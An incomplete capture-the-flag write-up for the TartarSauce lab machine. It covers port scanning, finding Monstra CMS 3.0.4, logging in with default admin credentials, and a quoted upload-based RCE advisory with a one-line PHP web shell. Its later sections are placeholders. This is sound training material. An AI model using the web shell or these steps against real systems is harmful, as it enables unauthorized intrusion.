# TartarSauce

**Machine ip:** 10.10.10.88

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.88 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.88`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e468c3a4-979b-4729-8cd7-db225339bf95)

+ The result shows that only 1 TCP port is open:
```
Port 80: Apache httpd 2.4.18
```

+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.88/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a3fed0d-ed3c-4538-ab8f-86b7cdd88fa8)

+ There's nothing interesting on the home page. Check the **robots.txt** file.
+ **robots.txt** gives a list of URLs that web robots are instructed not to visit.
+ Navigate to `http://10.10.10.88/robots.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1422866c-9dd2-4e85-a981-5bff15e6bf6c)

+ Discovered a **Monstra Content Management System (CMS)**, and the version number is **3.0.4**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/398c8557-d481-432f-8698-eb87791097ae)

+ Check whether it has any exploits.
+ `searchsploit monstra 3.0.4`
+ It's vulnerable to an authenticated RCE exploit. But firstly, it's a must to find credentials.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/45ee5d57-f857-4376-a13b-28698b5f264a)

+ Navigate to `http://10.10.10.88/webservices/monstra-3.0.4/admin/`
+ As always, try default values `admin`:`admin`
+ OK, we successfully logged on with `admin`:`admin`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ca184f3-7767-4244-8475-72d37a2ce9d5)

+ Now, transfer the exploit: `searchsploit -m 43348`
+ Check the exploit:
```
Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5',
'phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh',
'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat',
'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.


Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support – though this is not an
official status on their site (last official patch was released on
2012-11-29), the GitHub appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426
```

+ Create a **cmd.php7** file, and upload:
```
<?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>
```

+ Capture the upload request on burp, and follow redirection.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d7592bb-90be-42c8-9920-316bf344e32a)

+ It gives an error, "File was not uploaded". It's a rabbit hole, and skip it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a731e3d-2f19-42ac-9543-225ae5552b4c)

+ Do more enumeration.
+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/ -k -n -x html,php,txt -r -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6dfdf757-416d-4211-95ef-2e88d405f356)

+ When trying to access the **webservices** directory gives a 403 forbidden status code.
+ Run gobuster one more time on the **webservices** directory.
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices -k -n -x html,php,txt -r -t 50
```

+ **wp** directory discovered under webservices.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d5fb65f7-640b-4e1e-a939-2e9f1c1c6cc5)


## Gaining Access
+ xxx



## Privilege Escalation
+ xxx



# References & Alternatives
+ https://vvmlist.github.io/#TartarSauce
+ https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html
+ xxx

  
